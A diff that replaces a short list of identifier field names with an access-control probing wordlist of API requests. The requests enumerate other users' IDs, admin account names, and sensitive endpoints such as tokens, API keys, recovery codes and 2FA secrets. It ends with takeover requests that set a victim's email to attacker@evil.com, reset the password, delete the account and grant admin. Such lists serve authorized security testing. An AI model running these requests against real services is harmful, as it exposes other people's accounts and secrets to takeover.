@@ -1,9 +1,99 @@
-email
-username
-user
-login
-handle
-alias
-slug
-identifier
-ident
+GET /api/user/1
+GET /api/user/2
+GET /api/user/3
+GET /api/user/0
+GET /api/user/-1
+GET /api/users
+GET /api/users?page=1
+GET /api/users?page=2
+GET /api/users?all=true
+GET /api/user/admin
+GET /api/user/root
+GET /api/user/superadmin
+GET /api/user/administrator
+GET /api/user/moderator
+GET /api/user/manager
+GET /api/user/staff
+GET /api/user/service
+GET /api/user/system
+GET /api/user/api
+GET /api/user/bot
+GET /api/user/support
+GET /api/user/helpdesk
+GET /api/user/1/profile
+GET /api/user/2/profile
+GET /api/user/1/orders
+GET /api/user/2/orders
+GET /api/user/1/invoices
+GET /api/user/2/invoices
+GET /api/user/1/payments
+GET /api/user/2/payments
+GET /api/user/1/addresses
+GET /api/user/2/addresses
+GET /api/user/1/cards
+GET /api/user/2/cards
+GET /api/user/1/sessions
+GET /api/user/2/sessions
+GET /api/user/1/devices
+GET /api/user/2/devices
+GET /api/user/1/tokens
+GET /api/user/2/tokens
+GET /api/user/1/keys
+GET /api/user/2/keys
+GET /api/user/1/settings
+GET /api/user/2/settings
+GET /api/user/1/notifications
+GET /api/user/2/notifications
+GET /api/user/1/messages
+GET /api/user/2/messages
+GET /api/user/1/activity
+GET /api/user/2/activity
+GET /api/user/1/history
+GET /api/user/2/history
+GET /api/user/1/logs
+GET /api/user/2/logs
+GET /api/user/1/exports
+GET /api/user/2/exports
+GET /api/user/1/files
+GET /api/user/2/files
+GET /api/user/1/reports
+GET /api/user/2/reports
+GET /api/user/1/subscriptions
+GET /api/user/2/subscriptions
+GET /api/user/1/permissions
+GET /api/user/2/permissions
+GET /api/user/1/roles
+GET /api/user/2/roles
+GET /api/user/1/groups
+GET /api/user/2/groups
+GET /api/user/1/teams
+GET /api/user/2/teams
+GET /api/user/1/projects
+GET /api/user/2/projects
+GET /api/user/1/workspaces
+GET /api/user/2/workspaces
+GET /api/user/1/organizations
+GET /api/user/2/organizations
+GET /api/user/1/api-keys
+GET /api/user/2/api-keys
+GET /api/user/1/webhooks
+GET /api/user/2/webhooks
+GET /api/user/1/integrations
+GET /api/user/2/integrations
+GET /api/user/1/connected-accounts
+GET /api/user/2/connected-accounts
+GET /api/user/1/backup-codes
+GET /api/user/2/backup-codes
+GET /api/user/1/recovery-codes
+GET /api/user/2/recovery-codes
+GET /api/user/1/2fa-secret
+GET /api/user/2/2fa-secret
+GET /api/user/1/audit-log
+GET /api/user/2/audit-log
+GET /api/user/1/security-events
+GET /api/user/2/security-events
+DELETE /api/user/2 (as user 1)
+PUT /api/user/2/email {"email":"attacker@evil.com"}
+PUT /api/user/2/password {"password":"hacked"}
+PUT /api/user/2/role {"role":"admin"}
+PATCH /api/user/2 {"is_admin":true}
